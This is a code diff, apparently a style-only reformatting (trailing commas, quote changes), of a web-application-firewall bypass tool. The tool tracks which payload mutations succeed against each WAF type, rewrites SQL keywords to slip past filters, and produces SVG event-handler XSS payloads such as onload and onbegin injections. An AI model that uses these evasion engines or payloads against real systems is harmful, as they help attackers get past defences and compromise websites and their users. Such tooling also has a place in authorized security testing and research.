@@ -291,7 +291,7 @@ class AdaptiveMutationMemory:
                     timestamp REAL,
                     context TEXT
                 )
-            """
+            """,
             )
             conn.execute(
                 """
@@ -306,7 +306,7 @@ class AdaptiveMutationMemory:
                     last_updated REAL,
                     UNIQUE(waf_type, mutation_type, context)
                 )
-            """
+            """,
             )
             conn.execute(
                 """
@@ -319,13 +319,13 @@ class AdaptiveMutationMemory:
                     last_blocked REAL,
                     UNIQUE(waf_type, pattern_hash)
                 )
-            """
+            """,
             )
             conn.execute(
-                "CREATE INDEX IF NOT EXISTS idx_payload_hash ON payload_attempts(payload_hash)"
+                "CREATE INDEX IF NOT EXISTS idx_payload_hash ON payload_attempts(payload_hash)",
             )
             conn.execute(
-                "CREATE INDEX IF NOT EXISTS idx_waf_mutation ON mutation_scores(waf_type, mutation_type)"
+                "CREATE INDEX IF NOT EXISTS idx_waf_mutation ON mutation_scores(waf_type, mutation_type)",
             )
             conn.commit()
             if not self._is_memory:
@@ -380,7 +380,7 @@ class AdaptiveMutationMemory:
                 else:
                     # Record blocked pattern
                     pattern_hash = hashlib.md5(
-                        attempt.mutated_payload.encode()
+                        attempt.mutated_payload.encode(),
                     ).hexdigest()
                     conn.execute(
                         """
@@ -423,7 +423,7 @@ class AdaptiveMutationMemory:
                     conn.close()
 
     def get_best_mutations(
-        self, waf_type: WAFType, context: str, limit: int = 5
+        self, waf_type: WAFType, context: str, limit: int = 5,
     ) -> list[tuple[str, float]]:
         """Get best mutation types for a specific WAF and context."""
         with self._lock:
@@ -473,7 +473,7 @@ class AdaptiveMutationMemory:
                 stats["total_attempts"] = cursor.fetchone()[0]
 
                 cursor = conn.execute(
-                    "SELECT COUNT(*) FROM payload_attempts WHERE success = 1"
+                    "SELECT COUNT(*) FROM payload_attempts WHERE success = 1",
                 )
                 stats["successful_bypasses"] = cursor.fetchone()[0]
 
@@ -486,7 +486,7 @@ class AdaptiveMutationMemory:
                     FROM mutation_scores
                     ORDER BY score DESC
                     LIMIT 10
-                """
+                """,
                 )
                 stats["top_mutations"] = cursor.fetchall()
 
@@ -740,7 +740,7 @@ class SQLBypassEngine:
                 if keyword.upper() in result.upper():
                     alt = secrets.choice(alternatives)
                     result = re.sub(
-                        rf"\b{keyword}\b", alt, result, flags=re.IGNORECASE
+                        rf"\b{keyword}\b", alt, result, flags=re.IGNORECASE,
                     )
 
         # Level 3: Comment injection
@@ -850,7 +850,7 @@ class XSSBypassEngine:
             f'<svg/onload="{js_code}">',
             f"<svg><animate onbegin={js_code}>",
             f"<svg><set onbegin={js_code}>",
-            f'<svg><script>/{js_code}//</script>',
+            f"<svg><script>/{js_code}//</script>",
         ]
         return secrets.choice(payloads)
 
